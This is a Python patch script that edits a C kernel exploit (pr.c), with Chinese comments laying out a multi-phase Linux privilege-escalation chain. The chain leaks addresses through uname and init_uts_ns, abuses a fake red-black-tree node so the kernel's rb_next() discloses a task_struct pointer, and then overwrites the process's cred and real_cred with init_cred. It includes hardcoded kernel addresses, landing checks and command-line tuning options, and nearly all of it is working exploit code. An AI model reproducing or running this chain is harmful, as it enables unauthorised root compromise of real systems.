# -*- coding: utf-8 -*-
"""pr.c: 把 §13 的三发棋接进回合机 (一次进程调用 = 一条链, 每回合重造幽灵)

回合/相的对应 (phase 从 0 开始, 每相 = 一颗新幽灵 = 一笔有效写):
  相0  泄漏     : SHAPE=2, lock=hole1(uts+0x20), T=uts+0x08      ⇒ uname 读到 S
  相1  预置     : dst = hole2+0x10, val = S+0                    ⇒ 把 S 写成 hole2 的 rb_leftmost
  相2  读       : lock = hole2(uts+LK2), node->rb_right = X      ⇒ 内核 rb_next() 的返回值
                                                                         被写回 hole2+0x10 ⇒ uname 读回
                                                                  ⇒ 现场解析出"我们的 task_struct"
  相3/4 提权    : dst = T0+0x848 / T0+0x840, val = init_cred
★ 所有落点都在 init_uts_ns(.data, peek 现场量过), 且都满足 §12 的"邻居必须看得见且为 0"。
"""
import io

p = 'pr.c'
s = io.open(p, encoding='utf-8').read()

# ---------- 参数 ----------
a = 'static long TGT_ABS = -1;'
assert a in s
s = s.replace(a, a + '''
static long LK2_OFF2 = 0x54;                   /* hole2 在 init_uts_ns 内的偏移(第 2 块干净洞) */
static long XABS = 0xffffffc01292e200L + 0x6a8; /* 相2 的 rb_right: X+0x10 = init_task.tasks.prev */
static int RDPH = 2;                           /* 哪一相做 rb_next 读 */
static int PRIMEPH = 1;                        /* 哪一相预置 leftmost */''', 1)

# ---------- 载荷: 预置相 / 读相 ----------
b = '''    if (DST) {'''
assert b in s
s = s.replace(b, '''    if (ph == PRIMEPH && !DST) {
      /* 预置: 让 hole2+0x10(= rb_leftmost) = S ⇒ 相2 才会命中 `*leftmost == node` 分支 */
      P = LK_UTS + SLIDE + LK2_OFF2 + 0x10 - 8;
      C = S;
    } else if (ph == RDPH) {
      /* 读: lock = hole2, leftmost 已是 S = 节点 ⇒ 内核执行 rb_next(node) 并把结果写回 hole2+0x10 */
      P = S + 0x100;                           /* parent: 带内可读写值, 配对那笔落在带里(无害) */
      C = (uintptr_t)(XABS + SLIDE);           /* child = rb_right = X ⇒ rb_next 从 X 往左下潜 */
    } else if (DST) {''', 1)
# 读相的假 lock 必须就是 hole2 (leftmost 才等于 S)
s = s.replace('    uintptr_t C, P, FLOCK = h_S ? (S + 0x60) : (LK_INIT_UTS + LK_OFF + SLIDE);',
              '    uintptr_t C, P, FLOCK = h_S ? (S + 0x60) : (LK_INIT_UTS + LK_OFF + SLIDE);\n'
              '    if (ph == RDPH) FLOCK = LK_UTS + SLIDE + LK2_OFF2;   /* ★ 相2 的 lock = hole2 */', 1)

# ---------- 判据: 同时看 uts 和 probe ----------
c = '''      } else {
        char nm2[1024];
        read_sysname(nm2, sizeof nm2);
        if (strcmp(nm2, p0name)) {'''
assert c in s
s = s.replace(c, '''      } else {
        char nm2[1024];
        read_sysname(nm2, sizeof nm2);
        if (strcmp(nm2, p0name)) {            /* uts 里的落点: 直接可见 */
          hit = 1;
          say("[LAND] 相%d 靠 sysname 看见变化(第 %ld 发):\\n%s\\n", phase, tries, nm2);
          if (phase == RDPH) {
            /* hole2+0x10 = uts+0x64 ⇒ 在 dump 里是第 0x60 字节; 那里现在应当是个真 task 地址 */
            uintptr_t t0 = hexq(nm2, 0x60);
            say("[TASK] uts+0x64 读到 %016lx ⇒ task_struct?(非镜像即采纳)\\n", (unsigned long)
                t0);
            if (t0 && (t0 & 7) == 0 && !(t0 >= LK_TEXT_BASE + SLIDE &&
                                        t0 < LK_TEXT_BASE + SLIDE + 0x1C00000)) {
              TASK = t0; say("[TASK] 采纳 TASK=%016lx ⇒ 下一相起可写 cred/real_cred\\n",
                             (unsigned long)TASK);
            }
          }
          strcpy(p0name, nm2);
          if (phase >= NPH) break;
          if (!next_round(&phase, &rounds)) break;
          continue;
        }
        if (0) {''', 1)

# ---------- CLI ----------
d = '''    } else if (!strncmp(argv[i], "tgt=", 4)) {'''
assert d in s
s = s.replace(d, '''    } else if (!strncmp(argv[i], "lk2=", 4)) {
      LK2_OFF2 = (long)strtol(argv[i] + 4, NULL, 0);
    } else if (!strncmp(argv[i], "rdph=", 5)) {
      RDPH = (int)strtol(argv[i] + 5, NULL, 0);
    } else if (!strncmp(argv[i], "x=", 2)) {
      XABS = (long)strtoull(argv[i] + 2, NULL, 0);
    } else if (!strncmp(argv[i], "tgt=", 4)) {''', 1)

io.open(p, 'w', encoding='utf-8').write(s)
print('ok')
